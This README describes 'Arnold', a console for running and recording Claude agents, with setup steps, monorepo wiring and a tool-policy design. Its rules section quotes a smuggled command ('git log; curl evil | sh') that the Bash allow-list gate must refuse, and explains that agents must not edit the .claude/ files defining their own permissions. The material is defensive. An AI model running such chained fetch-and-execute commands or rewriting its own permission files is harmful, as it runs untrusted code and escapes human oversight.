# Arnold

**A**gent **R**unner, **N**otary, **O**rchestrator, **L**edger, **D**ispatcher.

A console for running Claude agents: list the registered agents, trigger a run,
watch the transcript live, and keep a durable record of what each run cost, what
code it saw, and what it produced.

The architecture and the phased plan live in the target repo at
`diamond_frontend/docs/agent-console-architecture.md`. This repo is Phase 0.

The five words are the five modules, not decoration:

| Word             | Module                        | Job                                                                     |
| ---------------- | ----------------------------- | ----------------------------------------------------------------------- |
| **Runner**       | `packages/core/runner.ts`     | Drives the Agent SDK `query()` loop with a tool policy it cannot escape |
| **Notary**       | `packages/core/notary.ts`     | Records what code the run saw: base SHA, branch, PR, ticket keys        |
| **Orchestrator** | `packages/core/registry.ts`   | Owns the registry and the run tree (subagent and harness children)      |
| **Ledger**       | `packages/core/ledger.ts`     | Daily cost and token caps, per agent and globally                       |
| **Dispatcher**   | `packages/core/dispatcher.ts` | Validates arguments, refuses what it should, and enqueues               |

## The one contract that must survive every phase

**The API enqueues, something else executes against a leased workspace, and runs
are durable records with declared artifacts.**

Phase 0 runs the executor in-process with SQLite and an EventEmitter. Phase 1
swaps in a worker process, Postgres, and Redis. Nothing above changes, because
only the components behind that sentence get replaced.

## Getting started

```bash
nvm use                # 22.22.3
npm i -g pnpm          # if you do not have it
cp .env.example .env.local
# fill in ANTHROPIC_API_KEY and check DIAMOND_FRONTEND_PATH
pnpm env:check         # confirms the env file is found before anything else runs
pnpm setup             # install, prisma generate, db push, seed
pnpm dev               # http://localhost:3000
```

`pnpm setup` seeds one repo row (`diamond-frontend`) and reconciles the registry
against that checkout's `.claude/` directory. Two agents come registered; every
other command and subagent it finds shows up as `unregistered`, visible but not
runnable until it gets a manifest overlay.

### One env file, injected twice

`.env.local` at the repo root is the only place these values live, and neither
tool finds it unaided. The Prisma CLI reads only `.env`, and only from its own
working directory or `./prisma`; Arnold's db scripts run with cwd
`packages/core`, so Prisma sees nothing and fails with
`P1012: Environment variable not found: DATABASE_URL`. Next has the opposite
problem: it reads env files from `apps/web`, not the repo root.

So two small shims inject the same file: `scripts/with-env.mjs` wraps the CLI
scripts, and `apps/web/next.config.mjs` loads it for the app. Both use Node's
built-in `process.loadEnvFile`, so there is no dotenv dependency and Windows
behaves the same as POSIX. Do not copy the values into
`packages/core/.env` or `apps/web/.env.local`; that turns one file into three.

If a db script fails, `with-env` names the missing variable and the directory it
looked in, rather than leaving you with Prisma's message about a schema line.

### Two more pieces of monorepo wiring

Both are small and both are load-bearing, so they are worth knowing before you
move files around.

**`@arnold/core` is a root dependency.** `registry/` is not a package, but its
manifests import `@arnold/core`, and Node resolves that from the importing file's
location rather than the working directory. Without the root dependency there is
no link above `registry/`, and both `pnpm seed` and the build's typecheck fail
with "Cannot find module @arnold/core". `apps/web/tsconfig.json` also maps the
path explicitly, because the build typechecks `registry/*.ts` through the import
graph using that tsconfig.

**HeroUI components that read their children must be client components.** Some
HeroUI components inspect their own children, and children created in a Server
Component are not real React elements at the point they run. `Tooltip` does
`if (!isValidElement(children)) trigger = jsx("p", {...})`, so a `Chip` inside it
becomes a `<div>` inside a `<p>`: invalid HTML and a hydration error. `Table`
uses React Aria's collection builder and throws
`Unknown element <[object Object]> in collection` outright. Neither shows up at
compile time.

`pnpm check:rsc` fails the build on that combination, and `pnpm build` runs it
first. If it flags a file, add `"use client"` as its first statement; add to the
component list in `scripts/check-rsc-boundaries.mjs` when adopting a new HeroUI
component with either behaviour.

**Webpack needs `extensionAlias`.** Core is TypeScript ESM, so its internal
imports carry the `.js` extension the emitted JavaScript would have
(`export * from "./agents.js"`). TypeScript resolves that to `agents.ts`;
webpack takes it literally and fails with "Can't resolve './agents.js'". The
`webpack()` hook in `next.config.mjs` tells it to try `.ts` and `.tsx` first.
Preferred over stripping the extensions from sixteen files, because those
extensions are what let core run under plain Node later, unbundled.

### Verifying without a database

Prisma's engine binaries are not always reachable (a sandboxed CI runner, an
offline box). Two scripts cover that case:

```bash
pnpm typecheck:offline   # generates a type stub from schema.prisma, then tsc
pnpm smoke ../diamond_frontend   # exercises prompt rendering + tool policy for real
pnpm check:rsc           # catches the RSC/HeroUI trap below; also runs in pnpm build
```

`pnpm smoke` is the useful one. It renders both registered agents' prompts from
the actual files in a checkout and asserts the substitutions landed, then tries
25 tool calls against the write-scope gate and asserts the right ones are
refused. A prompt whose `<PR>` token never got substituted still runs; it just
analyses the wrong PR. That class of bug is invisible without this.

## What is registered in Phase 0

| Agent               | Kind     | Write scope | Why it is first                                                     |
| ------------------- | -------- | ----------- | ------------------------------------------------------------------- |
| `work-order-scoper` | subagent | `read-only` | Cannot break anything, so it proves the pipeline end to end         |
| `pr-loop-analyzer`  | command  | `artifacts` | Writes exactly one report, so it proves artifact collection is real |

`work-order-scoper` normally runs as a child of `/plan-week`, once per survivor
of that command's screen. Here it is promoted to direct invocation so you can
paste one Jira issue and watch the whole path work.

Neither agent touches product code. Mutating agents (`pre-pr-review`,
`work-queue`, `fix-pr-comments`) arrive in Phase 4, once write scope is gated by
role and credentials are mounted per tier.

## The thing worth understanding before adding an agent

Every agent in `diamond_frontend/.claude/` enforces its own limits with **prompt
text only**. Command files carry no `tools:` frontmatter at all, and the two
subagents declare unrestricted `Bash`. `ai-smell-scan` says "You have no write
tools" and `work-order-scoper` says "you do not run git write commands", and
nothing stops either of them.

Turning those sentences into a manifest allow-list plus a credential policy is
what Arnold is for. That is why every manifest carries a `scopeEnforcement`
field: it starts at `prompt-only` and the UI shows it as a warning until someone
narrows the tools. Treat it as a to-do list, not a description.

Two rules fall out of that, and both are enforced in code rather than documented
and hoped for:

- **No agent may write under `.claude/`**, at any write scope. The executor
  mounts a real checkout, so an agent editing `.claude/` would be rewriting the
  registry source that defines its own permissions. Same for `.env*`, CI config,
  and release config.
- **`Bash` allow-list entries match per command segment.** `Bash(git log*)` must
  not carry `git log; curl evil | sh`, and a redirection target goes through the
  same write-path gate as `Write` does.

## Adding an agent

1. Write it in the target repo under `.claude/commands/` or `.claude/agents/`,
   with an `argument-hint` that matches the slots the body actually reads.
2. Hit registry sync. It appears as `unregistered`.
3. Add `registry/<repo-slug>/<id>.ts` with the manifest overlay. Narrow `Bash`
   to the specific invocations the prompt runs; a bare `Bash` means the declared
   write scope is fiction.
4. Give it structured output if it has none: a fenced JSON block, a JSONL
   append, or a report at a stable path. Without one, a run is visible but not
   chartable.
5. Keep its reason codes as its own list. `plan-week` emits
   `too-large-to-split`; `work-order-scoper` emits `too-large`. Merging the
   vocabularies splits one concept across two labels in every chart.
6. Dry-run it once with `permissionMode: "plan"` and read the transcript before
   letting anyone else press the button.

## Layout

```
arnold/
  packages/core/          types, store, and every runtime module
    prisma/schema.prisma  SQLite in Phase 0, Postgres in Phase 1
    src/agents.ts         the manifest contract; read this first
  registry/               manifest overlays, one directory per repo
    diamond-frontend/
  apps/web/               Next.js: UI + API routes + the SSE relay
  scripts/                seed, smoke test, offline type stub
```

`packages/core/src/agents.ts` is the file to read first. Everything else reads
from it.
